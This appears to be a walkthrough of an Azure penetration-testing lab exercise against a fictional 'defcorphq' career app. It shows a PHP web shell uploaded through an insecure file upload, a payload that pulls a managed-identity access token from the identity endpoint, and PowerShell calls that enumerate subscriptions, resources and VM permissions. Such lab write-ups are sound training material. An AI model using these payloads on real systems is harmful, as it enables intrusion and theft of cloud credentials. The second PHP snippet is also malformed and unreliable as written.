## Objective 10

```
- The career app in the defcorphq tenant allows insecure file upload functionality. Abuse the vulnerability and compromise the app service.
- Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources
```
- We can upload .phtml files using the file upload functionality.
`https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml`
```php
<?php
system($_REQUEST['cmd']);
?>
```
- Upload token.phtml file to retrieve `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`
`https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml`

```php
<?php
system(curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com?api-version=2017-09-01" -H secret:$IDENTITY_HEADER)
?>
```
- Use the access token and client ID from above with Az PowerShell. But **Az PowerShell needs tokens for both the azure resource manager (arn) and aad graph**. With only the arm token, we will get the below error after running Get-AzRoleAssignment
```powershell
$token = 'eyJ0ex....'
$account_id = '0645.....'
Connect-AzAccount -AccessToken $token -AccountId $account_id
```
![test](/img/obj10.png "Enumeration")

- We would need the **subscription ID**, use the code below to request it:
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value
```

- List **all resources accessible** for the managed identity assigned to the app service
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```
- What actions are allowed using the below code:
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
    }
}
(Invoke-RestMethod @RequestParams).value
```